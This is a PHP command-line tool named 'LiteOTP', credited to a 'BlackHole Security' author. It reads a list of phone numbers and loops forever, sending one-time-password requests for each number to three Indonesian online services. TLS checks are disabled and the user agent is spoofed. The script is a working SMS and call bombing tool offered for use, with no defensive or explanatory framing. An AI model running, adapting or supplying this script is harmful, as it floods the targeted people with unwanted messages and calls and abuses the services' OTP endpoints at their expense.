#!/usr/bin/env php
<?php
if(strtolower(substr(PHP_OS, 0, 3)) == 'win') {
    $R  = "";
    $RR = "";
    $G  = "";
    $GG = "";
    $B  = "";
    $BB = "";
    $Y  = "";
    $YY = "";
    $X  = "";
    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0';
} else {
    $R  = "\e[91m";
    $RR = "\e[91;7m";
    $G  = "\e[92m";
    $GG = "\e[92;7m";
    $B  = "\e[36m";
    $BB = "\e[36;7m";
    $Y  = "\e[93m";
    $YY = "\e[93;7m";
    $X  = "\e[0m";
    $ua = 'Mozilla/5.0 (Linux; Android 5.1.1; Andromax A16C3H Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36';
    system('clear');
}
function post_data($url,$data) {
	global $ua;
	$ch=curl_init($url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, $ua);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	return curl_exec($ch);
	curl_close($ch);
}
echo $Y.
"
 _     _ _        ___ _____ ____  
| |   (_) |_ ___ / _ \_   _|  _ \ 
| |   | | __/ _ \ | | || | | |_) |
| |___| | ||  __/ |_| || | |  __/ 
|_____|_|\__\___|\___/ |_| |_|";
echo $R."\n++++++++++++++++++++++++++++++++++++++";
echo $B."\nAuthor  : Cvar1984                   ".$R.'+';
echo $B."\nGithub  : https://github.com/Cvar1984".$R.'+';
echo $B."\nTeam    : BlackHole Security         ".$R.'+';
echo $B."\nVersion : 2.1                        ".$R.'+';
echo $B."\nDate    : 13-03-2018                 ".$R.'+';
echo $R."\n++++++++++++++++++++++++++++++++++++++".$G.$X."\n\n";
isset($argv[1]) OR die($RR."[!] Input No List [!]\n".$X);
if(!file_exists($argv[1])) {
	die($RR."[!] File Not Exists [!]".$X."\n");
}
$argv[1]=explode("\n", file_get_contents($argv[1]));
$jumlah=count($argv[1]);
$argv[1]=str_replace(' ','',$argv[1]);
while(1) {
foreach($argv[1] as $argv[2]):
	echo "Send OTP To -> ".$G.$argv[2].$X."\n";
	post_data('https://www.tokocash.com/oauth/otp',"msisdn=".$argv[2]."&accept=call");
	post_data("http://sc.jd.id/phone/sendPhoneSms","phone=".$argv[2]."&smsType=1");
	post_data("https://www.phd.co.id/en/users/sendOTP","phone_number=".$argv[2]);
endforeach;
}
die($Y.'=========================== Cvar1984 ))=====(@)>'.$X."\n");